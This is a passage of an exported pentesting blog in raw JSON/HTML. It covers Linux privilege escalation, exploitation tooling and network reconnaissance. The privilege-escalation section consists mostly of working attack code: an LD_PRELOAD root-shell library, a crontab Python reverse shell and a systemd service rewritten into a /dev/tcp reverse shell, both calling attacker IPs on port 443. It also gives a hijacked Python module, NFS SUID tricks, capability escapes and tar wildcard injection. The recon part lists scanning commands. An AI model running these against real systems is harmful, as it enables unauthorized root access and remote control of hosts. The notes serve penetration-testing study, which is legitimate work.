bash\">/home/user/vulnerable</code></pre>\n\n<br>\n\n<h2 id=\"LD-PRELOAD-SUID\"><a href=\"#LD-PRELOAD-SUID\" class=\"headerlink\" title=\"LD_PRELOAD SUID\"></a>LD_PRELOAD SUID</h2><blockquote>\n<p>LD_PRELOAD is an environment variable used in Unix-like operating systems that allows you to specify additional shared libraries to be loaded before others. This can override existing functions in the target programs shared libraries.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> -l</code></pre>\n<pre><code class=\"highlight plain\">Matching Defaults entries for user on this host:\n    env_reset, env_keep+=LD_PRELOAD</code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">env</span> <span class=\"comment\"># look for LD_PRELOAD</span></code></pre>\n<pre><div class=\"caption\"><span>/tmp/malicious.c - create a library that overrides the standard one</span></div><code class=\"highlight c\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span>\n<span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span>\n<span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span>\n\n<span class=\"type\">void</span> _init() &#123;\n    unsetenv(<span class=\"string\">&quot;LD_PRELOAD&quot;</span>);\n    setgid(<span class=\"number\">0</span>);\n    setuid(<span class=\"number\">0</span>);\n    system(<span class=\"string\">&quot;/bin/bash&quot;</span>);\n&#125;</code></pre>\n<pre><div class=\"caption\"><span>compile the shared library</span></div><code class=\"highlight bash\">gcc -fPIC -shared -o /tmp/malicious.so /tmp/malicious.c -nostartfiles</code></pre>\n<pre><div class=\"caption\"><span>set the new library</span></div><code class=\"highlight bash\"><span class=\"built_in\">export</span> LD_PRELOAD=/tmp/malicious.so\n<span class=\"built_in\">printenv</span> LD_PRELOAD</code></pre>\n<pre><div class=\"caption\"><span>run a program such as apache</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> LD_PRELOAD=/tmp/malicious.so apache2</code></pre>\n\n<br>\n\n<h2 id=\"Writable-crontab\"><a href=\"#Writable-crontab\" class=\"headerlink\" title=\"Writable crontab\"></a>Writable crontab</h2><blockquote>\n<p>Define commands that should be executed on the system at regular intervals</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\">(crontab -l; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;* * * * * /bin/echo &#x27;Crontab is writable&#x27; &gt; /tmp/crontab_test&quot;</span>) | crontab -</code></pre>\n\n<p><strong>Exploit</strong><br>Extract attacker IP</p>\n<pre><code class=\"highlight bash\">ip a s</code></pre>\n<p>Add line to crontab (open <code>nano</code> editor)</p>\n<pre><code class=\"highlight bash\">crontab -e</code></pre>\n<pre><div class=\"caption\"><span>crontab command</span></div><code class=\"highlight bash\">* * * * * python3 -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.10&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></code></pre>\n\n<br>\n\n<h2 id=\"Symbolic-link-symlinks\"><a href=\"#Symbolic-link-symlinks\" class=\"headerlink\" title=\"Symbolic link (symlinks)\"></a>Symbolic link (symlinks)</h2><blockquote>\n<p>An attacker can create a symbolic link pointing to a sensitive or writable file (e.g., a file with elevated privileges). If a privileged process or script follows this symlink and modifies the target file, it can lead to unauthorized actions.</p>\n<ol>\n<li>Find a writable directory that is accessible to a user who can exploit it.</li>\n<li>Identify a script or process running as a privileged user that might follow symbolic links.</li>\n<li>Create a symbolic link in that writable directory pointing to a sensitive or critical file that the privileged process might interact with.</li>\n</ol>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>Find writable directories</span></div><code class=\"highlight bash\">find / -<span class=\"built_in\">type</span> d -writable 2&gt;/dev/null</code></pre>\n<pre><div class=\"caption\"><span>List processes with elevated privileges (e.g., cron jobs)</span></div><code class=\"highlight bash\">ps aux | grep -E <span class=\"string\">&#x27;(crond|atd|systemd|root)&#x27;</span></code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>Create a symlink in a writable directory</span></div><code class=\"highlight bash\"><span class=\"built_in\">cd</span> /tmp\n<span class=\"built_in\">ln</span> -s /etc/passwd /tmp/my_symlink</code></pre>\n<pre><div class=\"caption\"><span>Trigger the privileged process</span></div><code class=\"highlight bash\"><span class=\"built_in\">touch</span> /tmp/my_symlink</code></pre>\n<pre><div class=\"caption\"><span>Verify exploitation</span></div><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -l /etc/passwd</code></pre>\n\n<br>\n\n<h2 id=\"Import-modified-python-module\"><a href=\"#Import-modified-python-module\" class=\"headerlink\" title=\"Import modified python module\"></a>Import modified <code>python</code> module</h2><blockquote>\n<p>Python scripts running with elevated privileges can be exploited if they import modules from directories writable by untrusted users. An attacker can place a malicious library in such a directory to execute arbitrary code with elevated privileges.</p>\n<ul>\n<li><strong>Identify the target script</strong>: Find a script running as a privileged user that imports modules.</li>\n<li><strong>Writable directory</strong>: Determine if the script imports from a directory writable by non-privileged users.</li>\n<li><strong>Create a malicious module</strong>: Place a malicious module in the writable directory.</li>\n<li><strong>Exploit</strong>: When the script imports the malicious module, it executes the attackers code with elevated privileges.</li>\n</ul>\n</blockquote>\n<p><strong>Test</strong><br>Example: <code>/priv/vuln.py</code> imports a custom module from writable directory <code>/home/user</code></p>\n<pre><div class=\"caption\"><span>/priv/vuln.py</span></div><code class=\"highlight python\"><span class=\"keyword\">import</span> some_module\n...</code></pre>\n<pre><div class=\"caption\"><span>Module search path for this script</span></div><code class=\"highlight bash\">python3 -c <span class=\"string\">&quot;import sys; print(sys.path)&quot;</span></code></pre>\n<pre><div class=\"caption\"><span>Example outputs</span></div><code class=\"highlight bash\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python3.8&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python3.8/plat-x86_64-linux-gnu&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python3.8/lib-dynload&#x27;</span>, <span class=\"string\">&#x27;/home/user/.local/lib/python3.8/site-packages&#x27;</span>, <span class=\"string\">&#x27;/usr/local/lib/python3.8/dist-packages&#x27;</span>, <span class=\"string\">&#x27;/home/user&#x27;</span>]</code></pre>\n<p>If one of those is <code>/home/user</code> (the writable directory), we can exploit the vulnerable script.</p>\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>Create a malicious module</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;import os; os.system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; /home/user/some_module.py</code></pre>\n<pre><div class=\"caption\"><span>Run the privileged script with updated module</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> python3 /priv/vuln.py</code></pre>\n\n\n<br>\n\n<h2 id=\"NFS-no-root-squash-no-all-squash\"><a href=\"#NFS-no-root-squash-no-all-squash\" class=\"headerlink\" title=\"NFS no_root_squash &#x2F; no_all_squash\"></a>NFS <code>no_root_squash</code> &#x2F; <code>no_all_squash</code></h2><blockquote>\n<p><code>no_root_squash</code>: Allows root user on NFS client to retain root privileges on the NFS server.<br><code>no_all_squash</code>: Prevents mapping of all users to anonymous user (nobody), keeping their original privileges.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>command</span></div><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /etc/exports</code></pre>\n<pre><div class=\"caption\"><span>example output</span></div><code class=\"highlight plain\">/home/chronos *(rw,fsid=0,sync,no_root_squash,insecure)</code></pre>\n\n<p><strong>Exploit</strong> - 1. attacker machine</p>\n<pre><div class=\"caption\"><span>mount the NFS share</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> /mnt/nfs\nmount -t nfs <span class=\"variable\">$IP</span>:/path/to/share /mnt/nfs</code></pre>\n<pre><div class=\"caption\"><span>create a root-owned file and a SUID shell</span></div><code class=\"highlight bash\"><span class=\"built_in\">touch</span> /mnt/nfs/root_owned_file\n<span class=\"built_in\">echo</span> <span class=\"string\">&#x27;#!/bin/bash&#x27;</span> &gt; /mnt/nfs/suid_shell\n<span class=\"built_in\">echo</span> <span class=\"string\">&#x27;chmod +s /bin/bash&#x27;</span> &gt;&gt; /mnt/nfs/suid_shell\n<span class=\"built_in\">chmod</span> +x /mnt/nfs/suid_shell</code></pre>\n<p><strong>Exploit</strong> - 2. victim machine</p>\n<pre><div class=\"caption\"><span>execute the payload</span></div><code class=\"highlight bash\">/mnt/nfs/suid_shell\n/bin/bash -p</code></pre>\n\n<br>\n\n<h2 id=\"Linux-capabilities\"><a href=\"#Linux-capabilities\" class=\"headerlink\" title=\"Linux capabilities\"></a>Linux capabilities</h2><blockquote>\n<p>Linux capabilities allow programs to perform privileged operations without granting full root permissions. When a binary has capabilities like cap_setuid, it can be exploited to gain root privileges.<br>This applies to any binary, but well use <code>python</code> as an example.</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>list capabilities of binaries on the system</span></div><code class=\"highlight bash\"><span class=\"built_in\">getcap</span> -r / 2&gt;/dev/null</code></pre>\n<pre><div class=\"caption\"><span>example output</span></div><code class=\"highlight plain\">/usr/bin/python2.6 = cap_setuid+ep</code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>change its user ID to root</span></div><code class=\"highlight bash\">/usr/bin/python2.6 -c <span class=\"string\">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>\n\n<p>Common binaries wih capabilities</p>\n<pre><code class=\"highlight bash\">python3 -c <span class=\"string\">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">perl -e <span class=\"string\">&#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">ruby -e <span class=\"string\">&#x27;exec &quot;/bin/bash&quot;&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">gdb -nx -ex <span class=\"string\">&#x27;!sh&#x27;</span> -ex quit</code></pre>\n<pre><code class=\"highlight bash\">cpython -c <span class=\"string\">&#x27;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#x27;</span></code></pre>\n<pre><code class=\"highlight bash\">tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=<span class=\"built_in\">exec</span>=/bin/bash</code></pre>\n\n<br>\n\n<h2 id=\"tar-wildcard-with-cron-job\"><a href=\"#tar-wildcard-with-cron-job\" class=\"headerlink\" title=\"tar wildcard (with cron job)\"></a><code>tar</code> wildcard (with cron job)</h2><blockquote>\n<p><strong>Wildcards in tar</strong>: When <code>tar</code> encounters filenames starting with <code>--</code>, it treats them as command-line options. This can be exploited to inject tar options like <code>--checkpoint</code> and <code>--checkpoint-action</code>, which can execute arbitrary commands.<br><strong>Cron Job</strong>: The cron job running the vulnerable script executes the <code>tar</code> command periodically, triggering the exploit when the special files are present.</p>\n</blockquote>\n<p><strong>Test</strong><br>Identify the vulnerability</p>\n<pre><div class=\"caption\"><span>example script</span></div><code class=\"highlight bash\"><span class=\"built_in\">cat</span> /home/user/compress.sh</code></pre>\n<pre><div class=\"caption\"><span>compress.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/sh</span>\n<span class=\"built_in\">cd</span> /home/user\ntar czf /tmp/backup.tar.gz *</code></pre>\n<p>Cron job</p>\n<pre><div class=\"caption\"><span>list cron jobs</span></div><code class=\"highlight bash\">crontab -l</code></pre>\n<pre><div class=\"caption\"><span>cron job line</span></div><code class=\"highlight bash\">* * * * * /usr/local/bin/compress.sh</code></pre>\n\n<p><strong>Exploit</strong><br>Create files with names that <code>tar</code> will interpret as options</p>\n<pre><code class=\"highlight bash\"><span class=\"comment\"># Create a payload script</span>\n<span class=\"built_in\">echo</span> <span class=\"string\">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; /home/user/runme.sh\n\n<span class=\"comment\"># Create special files to inject `tar` options</span>\n<span class=\"built_in\">touch</span> /home/user/--checkpoint=1\n<span class=\"built_in\">touch</span> /home/user/--checkpoint-action=<span class=\"built_in\">exec</span>=sh\\ runme.sh</code></pre>\n\n<p>Wait for the cron job to execute</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sleep</span> 60\n/tmp/bash -p</code></pre>\n\n<br>\n\n<h2 id=\"Restart-service\"><a href=\"#Restart-service\" class=\"headerlink\" title=\"Restart service\"></a>Restart service</h2><blockquote>\n<p>Locate the config file for the respective service and replace <em>action on reload</em> with a reverse shell</p>\n</blockquote>\n<p><strong>Test</strong></p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> -l</code></pre>\n<pre><code class=\"highlight plain\">(ALL : ALL) /usr/sbin/service vsftpd restart</code></pre>\n\n<p><strong>Exploit</strong><br>View the config file for the service (<code>vsftpd</code> in this example)</p>\n<pre><code class=\"highlight bash\">locate vsftpd.service</code></pre>\n<pre><code class=\"highlight plain\">/etc/systemd/system/multi-user.target.wants/vsftpd.service</code></pre>\n<p>Add the attacker IP in the modified service config (reverse shell).</p>\n<div style=\"display: flex; justify-content: space-between;\">\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Default service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    <pre><code class=\"highlight conf\">[Unit]\nDescription=vsftpd FTP server\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf\nExecReload=/bin/kill -HUP $MAINPID\nExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty\n\n[Install]\nWantedBy=multi-user.target</code></pre>\n    </pre>\n  </div>\n  <div style=\"flex: 1; padding: 2px; min-width: 300px;\">\n    <p>Modified service configuration</p>\n    <pre style=\"overflow-x: auto; white-space: nowrap;\">\n    <pre><code class=\"highlight conf\">[Unit]\nDescription=vsftpd FTP server\nAfter=network.target\n\n[Service]\nUser=root\nType=simple\nExecStart=/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1&#x27;\n\n\n[Install]\nWantedBy=multi-user.target</code></pre>\n    </pre>\n  </div>\n</div>\n\n<br>\n\n<h2 id=\"Shell-in-input-prompt\"><a href=\"#Shell-in-input-prompt\" class=\"headerlink\" title=\"Shell in input prompt\"></a>Shell in input prompt</h2><p><strong>Test</strong></p>\n<pre><div class=\"caption\"><span>script.sh</span></div><code class=\"highlight bash\"><span class=\"meta\">#!/bin/bash</span>\n<span class=\"built_in\">read</span> -p <span class=\"string\">&quot;What&#x27;s you name: &quot;</span></code></pre>\n\n<p><strong>Exploit</strong></p>\n<pre><div class=\"caption\"><span>payload</span></div><code class=\"highlight bash\">/bin/bash -i</code></pre>\n\n<br>\n\n<hr>\n<hr>"},{"title":"4. Exploitation - Linux","date":"2024-08-02T09:00:00.000Z","toc":true,"_content":"\n---\nStep 4 in a penetration test: Exploitation.\nExploit the vulnerabilities found to gain access to the target machine.\n\n---\n<!-- more -->\n\n<br>\n\n\n## Specialized tools\n```bash\nnikto\nmsfconsole\nnmap --script vuln\nsearchsploit\n```\n\n<br>\n\n## Google dorking\n- search for default passwords in login forms on different applications\n- search source code to find relevant files without fuzzing\n- see changes made in Git applications to remediate vulnerabilities\n\n\n<br>\n\n## Other\n- use Wappalyzer browser add-on to see the technologies used by the web application\n- \n\n<br>\n\n---\n---\n","source":"_posts/Pentesting/Linux/4.md","raw":"---\ntitle: 4. Exploitation - Linux\ndate: 2024-08-02 12:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - Exploitation\ntoc: true\n---\n\n---\nStep 4 in a penetration test: Exploitation.\nExploit the vulnerabilities found to gain access to the target machine.\n\n---\n<!-- more -->\n\n<br>\n\n\n## Specialized tools\n```bash\nnikto\nmsfconsole\nnmap --script vuln\nsearchsploit\n```\n\n<br>\n\n## Google dorking\n- search for default passwords in login forms on different applications\n- search source code to find relevant files without fuzzing\n- see changes made in Git applications to remediate vulnerabilities\n\n\n<br>\n\n## Other\n- use Wappalyzer browser add-on to see the technologies used by the web application\n- \n\n<br>\n\n---\n---\n","slug":"Pentesting/Linux/4","published":1,"updated":"2024-09-23T06:18:55.856Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhl000d6gvg6urvcs4t","content":"<hr>\n<p>Step 4 in a penetration test: Exploitation.<br>Exploit the vulnerabilities found to gain access to the target machine.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n\n<h2 id=\"Specialized-tools\"><a href=\"#Specialized-tools\" class=\"headerlink\" title=\"Specialized tools\"></a>Specialized tools</h2><pre><code class=\"highlight bash\">nikto\nmsfconsole\nnmap --script vuln\nsearchsploit</code></pre>\n\n<br>\n\n<h2 id=\"Google-dorking\"><a href=\"#Google-dorking\" class=\"headerlink\" title=\"Google dorking\"></a>Google dorking</h2><ul>\n<li>search for default passwords in login forms on different applications</li>\n<li>search source code to find relevant files without fuzzing</li>\n<li>see changes made in Git applications to remediate vulnerabilities</li>\n</ul>\n<br>\n\n<h2 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h2><ul>\n<li>use Wappalyzer browser add-on to see the technologies used by the web application</li>\n<li></li>\n</ul>\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Step 4 in a penetration test: Exploitation.<br>Exploit the vulnerabilities found to gain access to the target machine.</p>\n<hr>","more":"<br>\n\n\n<h2 id=\"Specialized-tools\"><a href=\"#Specialized-tools\" class=\"headerlink\" title=\"Specialized tools\"></a>Specialized tools</h2><pre><code class=\"highlight bash\">nikto\nmsfconsole\nnmap --script vuln\nsearchsploit</code></pre>\n\n<br>\n\n<h2 id=\"Google-dorking\"><a href=\"#Google-dorking\" class=\"headerlink\" title=\"Google dorking\"></a>Google dorking</h2><ul>\n<li>search for default passwords in login forms on different applications</li>\n<li>search source code to find relevant files without fuzzing</li>\n<li>see changes made in Git applications to remediate vulnerabilities</li>\n</ul>\n<br>\n\n<h2 id=\"Other\"><a href=\"#Other\" class=\"headerlink\" title=\"Other\"></a>Other</h2><ul>\n<li>use Wappalyzer browser add-on to see the technologies used by the web application</li>\n<li></li>\n</ul>\n<br>\n\n<hr>\n<hr>"},{"title":"2. Reconnaissance - Linux","date":"2024-08-02T07:00:00.000Z","toc":true,"_content":"\n---\nStep 2 in a penetration test: Reconnaissance.\nNetwork (for singe and multiple hosts) and OSINT recon.\n\n---\n<!-- more -->\n\n<br>\n\n## Prepare your environment\n```bash Create a separate directory for the target\n# replace 'target'\nmkdir -p ~/pentests/target\n```\n\n```bash Prepare the environment variables\nexport NET=10.10.10.0/24\nexport domain=example.com\nexport IP=10.10.10.1\nexport URL=http://$IP\n# I don't advice using $URL because you might miss other ports or HTTPS\n# Remember to add odd web ports (8080,8000,8008) and https if needed\n```\n\n```bash Prepare files and directories\nmkdir vulns recon files notes\ntouch notes/{notes.txt,users.txt,passwords.txt,hashes.txt,creds.txt}\n```\n\n<br>\n\n## Network recon\n\n<br>\n```bash netdiscover\nsudo netdiscover -i eth0 -r $NET\n```\n```bash fping\nfping -a -g $NET 2>/dev/null > recon/hosts\n```\n```bash masscan\nmasscan $NET echo > recon/masscan-output.conf\n```\n```bash nmap\nnmap -sn $NET -oA recon/nmap.discovery;\ncat recon/nmap.discovery | grep -i report | cut -d' ' -f5 > recon/hosts\n```\n```bash no man's land\nfor ip in 30 31 35; do ping -c 1 -W 1 10.10.10.$ip &>/dev/null && echo \"10.10.10.$ip is up\"; done\n```\n\n<br>\n\n## Single host recon\n```bash Nmap intelligent scan\n# initial scan\nnmap -Pn -T4 -p- --open --max-retries 5 --system-dns --stats-every 5s $IP --oA recon/nmap.init\n# extract open ports\ncat recon/nmap.init.nmap | grep '/.*open'| cut -d '/' -f 1| tr '\\n' ', '| sed 's/.$//g' > recon/ports;\n# full scan on open ports\nsudo nmap -Pn -sV -n -v -A -T4 -p $(cat recon/ports) $IP -oA recon/nmap.alltcp\n```\n```bash Nmap vuln scan (with open ports)\nnmap --script vulners -Pn -sC -sV -v -A -T4 -p $(cat recon/ports) $IP -oA recon/nmap.vuln\n```\n```bash Nmap UDP scan (takes long)\nnmap -sCVU -n -F -T4 $IP -oA recon/nmap.udp\n```\n```bash Nmap IPv6 scan\nping -6 $IP\ndig AAAA $domain\n\nnmap -p- -6 --min-rate 10000 $IPv6\n<br>\n\n```bash Rustscan\nrustscan -a $IP --ulimit 5000 --batch-size 2500 -- -sC -sV -v -oN recon/rustscan.init\n```\n\n```bash Autorecon\nautorecon -v --heartbeat 10\n```\n\n```bash Zenmap (GUI interface)\nzenmap \n```\n\n```bash Legion (GUI interface)\nsudo legion\n```\n<br>\n\n```bash no man's land\nfor ip in 30 31 35; do\n    echo \"Scanning 10.10.10.$ip\"\n    for port in {1..65535}; do\n        (echo > /dev/tcp/10.10.10.$ip/$port) &>/dev/null && echo \"Port $port is open on 10.10.10.$ip\"\n    done\ndone\n```\n\n\n<br>\n\n## OSINT recon\n\n```bash\nrecon-ng\n```\n\n<br>\n\n---\n---\n","source":"_posts/Pentesting/Linux/2.md","raw":"---\ntitle: 2. Reconnaissance - Linux\ndate: 2024-08-02 10:00:00\ncategories:\n  - Pentesting\n  - Linux\ntags:\n  - Pentesting\n  - Linux\n  - Reconnaissance\ntoc: true\n---\n\n---\nStep 2 in a penetration test: Reconnaissance.\nNetwork (for singe and multiple hosts) and OSINT recon.\n\n---\n<!-- more -->\n\n<br>\n\n## Prepare your environment\n```bash Create a separate directory for the target\n# replace 'target'\nmkdir -p ~/pentests/target\n```\n\n```bash Prepare the environment variables\nexport NET=10.10.10.0/24\nexport domain=example.com\nexport IP=10.10.10.1\nexport URL=http://$IP\n# I don't advice using $URL because you might miss other ports or HTTPS\n# Remember to add odd web ports (8080,8000,8008) and https if needed\n```\n\n```bash Prepare files and directories\nmkdir vulns recon files notes\ntouch notes/{notes.txt,users.txt,passwords.txt,hashes.txt,creds.txt}\n```\n\n<br>\n\n## Network recon\n\n<br>\n```bash netdiscover\nsudo netdiscover -i eth0 -r $NET\n```\n```bash fping\nfping -a -g $NET 2>/dev/null > recon/hosts\n```\n```bash masscan\nmasscan $NET echo > recon/masscan-output.conf\n```\n```bash nmap\nnmap -sn $NET -oA recon/nmap.discovery;\ncat recon/nmap.discovery | grep -i report | cut -d' ' -f5 > recon/hosts\n```\n```bash no man's land\nfor ip in 30 31 35; do ping -c 1 -W 1 10.10.10.$ip &>/dev/null && echo \"10.10.10.$ip is up\"; done\n```\n\n<br>\n\n## Single host recon\n```bash Nmap intelligent scan\n# initial scan\nnmap -Pn -T4 -p- --open --max-retries 5 --system-dns --stats-every 5s $IP --oA recon/nmap.init\n# extract open ports\ncat recon/nmap.init.nmap | grep '/.*open'| cut -d '/' -f 1| tr '\\n' ', '| sed 's/.$//g' > recon/ports;\n# full scan on open ports\nsudo nmap -Pn -sV -n -v -A -T4 -p $(cat recon/ports) $IP -oA recon/nmap.alltcp\n```\n```bash Nmap vuln scan (with open ports)\nnmap --script vulners -Pn -sC -sV -v -A -T4 -p $(cat recon/ports) $IP -oA recon/nmap.vuln\n```\n```bash Nmap UDP scan (takes long)\nnmap -sCVU -n -F -T4 $IP -oA recon/nmap.udp\n```\n```bash Nmap IPv6 scan\nping -6 $IP\ndig AAAA $domain\n\nnmap -p- -6 --min-rate 10000 $IPv6\n<br>\n\n```bash Rustscan\nrustscan -a $IP --ulimit 5000 --batch-size 2500 -- -sC -sV -v -oN recon/rustscan.init\n```\n\n```bash Autorecon\nautorecon -v --heartbeat 10\n```\n\n```bash Zenmap (GUI interface)\nzenmap \n```\n\n```bash Legion (GUI interface)\nsudo legion\n```\n<br>\n\n```bash no man's land\nfor ip in 30 31 35; do\n    echo \"Scanning 10.10.10.$ip\"\n    for port in {1..65535}; do\n        (echo > /dev/tcp/10.10.10.$ip/$port) &>/dev/null && echo \"Port $port is open on 10.10.10.$ip\"\n    done\ndone\n```\n\n\n<br>\n\n## OSINT recon\n\n```bash\nrecon-ng\n```\n\n<br>\n\n---\n---\n","slug":"Pentesting/Linux/2","published":1,"updated":"2024-09-23T06:18:55.855Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhm000e6gvg8ryf9ies","content":"<hr>\n<p>Step 2 in a penetration test: Reconnaissance.<br>Network (for singe and multiple hosts) and OSINT recon.</p>\n<hr>\n<span id=\"more\"></span>\n\n<br>\n\n<h2 id=\"Prepare-your-environment\"><a href=\"#Prepare-your-environment\" class=\"headerlink\" title=\"Prepare your environment\"></a>Prepare your environment</h2><pre><div class=\"caption\"><span>Create a separate directory for the target</span></div><code class=\"highlight bash\"><span class=\"comment\"># replace &#x27;target&#x27;</span>\n<span class=\"built_in\">mkdir</span> -p ~/pentests/target</code></pre>\n\n<pre><div class=\"caption\"><span>Prepare the environment variables</span></div><code class=\"highlight bash\"><span class=\"built_in\">export</span> NET=10.10.10.0/24\n<span class=\"built_in\">export</span> domain=example.com\n<span class=\"built_in\">export</span> IP=10.10.10.1\n<span class=\"built_in\">export</span> URL=http://<span class=\"variable\">$IP</span>\n<span class=\"comment\"># I don&#x27;t advice using $URL because you might miss other ports or HTTPS</span>\n<span class=\"comment\"># Remember to add odd web ports (8080,8000,8008) and https if needed</span></code></pre>\n\n<pre><div class=\"caption\"><span>Prepare files and directories</span></div><code class=\"highlight bash\"><span class=\"built_in\">mkdir</span> vulns recon files notes\n<span class=\"built_in\">touch</span> notes/&#123;notes.txt,users.txt,passwords.txt,hashes.txt,creds.txt&#125;</code></pre>\n\n<br>\n\n<h2 id=\"Network-recon\"><a href=\"#Network-recon\" class=\"headerlink\" title=\"Network recon\"></a>Network recon</h2><br>\n<pre><div class=\"caption\"><span>netdiscover</span></div><code class=\"highlight bash\"><span class=\"built_in\">sudo</span> netdiscover -i eth0 -r <span class=\"variable\">$NET</span></code></pre>\n<pre><div class=\"caption\"><span>fping</span></div><code class=\"highlight bash\">fping -a -g <span class=\"variable\">$NET</span> 2&gt;/dev/null &gt; recon/hosts</code></pre>\n<pre><div class=\"caption\"><span>masscan</span></div><code class=\"highlight bash\">masscan <span class=\"variable\">$NET</span> <span class=\"built_in\">echo</span> &gt; recon/masscan-output.conf</code></pre>\n<pre><div class=\"caption\"><span>nmap</span></div><code class=\"highlight bash\">nmap -sn <span class=\"variable\">$NET</span> -oA recon/nmap.discovery;\n<span class=\"built_in\">cat</span> recon/nmap.discovery | grep -i report | <span class=\"built_in\">cut</span> -d<span class=\"string\">&#x27; &#x27;</span> -f5 &gt; recon/hosts</code></pre>\n<pre><div class=\"caption\"><span>no man's land</span></div><code class=\"highlight bash\"><span class=\"keyword\">for</span> ip <span class=\"keyword\">in</span> 30 31 35; <span class=\"keyword\">do</span> ping -c 1 -W 1 10.10.10.<span class=\"variable\">$ip</span> &amp;&gt;/dev/null &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">&quot;10.10.10.<span class=\"variable\">$ip</span> is up&quot;</span>; <span class=\"keyword\">done</span></code></pre>\n\n<br>\n\n<h2 id=\"Single-host-recon\"><a href=\"#Single-host-recon\" class=\"headerlink\" title=\"Single host recon\"></a>Single host recon</h2><pre><div class=\"caption\"><span>Nmap intelligent scan</span></div><code class=\"highlight bash\"><span class=\"comment\"># initial scan</span>\nnmap -Pn -T4 -p- --open --max-retries 5 --system-dns --stats-every 5s <span class=\"variable\">$IP</span> --oA recon/nmap.init\n<span class=\"comment\"># extract open ports</span>\n<span class=\"built_in\">cat</span> recon/nmap.init.nmap | grep <span class=\"string\">&#x27;/.*open&#x27;</span>| <span class=\"built_in\">cut</span> -d <span class=\"string\">&#x27;/&#x27;</span> -f 1| <span class=\"built_in\">tr</span> <span class=\"string\">&#x27;\\n&#x27;</span> <span class=\"string\">&#x27;, &#x27;</span>| sed <span class=\"string\">&#x27;s/.$//g&#x27;</span> &gt; recon/ports;\n<span class=\"comment\"># full scan on open ports</span>\n<span class=\"built_in\">sudo</span> nmap -Pn -sV -n -v -A -T4 -p $(<span class=\"built_in\">cat</span> recon/ports) <span class=\"variable\">$IP</span> -oA recon/nmap.alltcp</code></pre>\n<pre><div class=\"caption\"><span>Nmap vuln scan (with open ports)</span></div><code class=\"highlight bash\">nmap --script vulners -Pn -sC -sV -v -A -T4 -p $(<span class=\"built_in\">cat</span> recon/ports) <span class=\"variable\">$IP</span> -oA recon/nmap.vuln</code></pre>\n<pre><div class=\"caption\"><span>Nmap UDP scan (takes long)</span></div><code class=\"highlight bash\">nmap -sCVU -n -F -T4 <span class=\"variable\">$IP</span> -oA recon/nmap.udp</code></pre>\n<pre><div class=\"caption\"><span>Nmap IPv6 scan</span></div><code class=\"highlight bash\">ping -6 <span class=\"variable\">$IP</span>\ndig AAAA <span class=\"variable\">$domain</span>\n\nnmap -p- -6 --min-rate 10000 <span class=\"variable\">$IPv6</span>\n&lt;br&gt;\n\n```bash Rustscan\nrustscan -a <span class=\"variable\">$IP</span> --<span class=\"built_in\">ulimit</span> 5000 --batch-size 2500 -- -sC -sV -v -oN recon/rustscan.init</code></pre>\n\n<pre><div class=\"caption\"><span>Autorecon</span></div><code class=\"highlight bash\">autorecon -v --heartbeat 10</code></pre>\n\n<pre><div 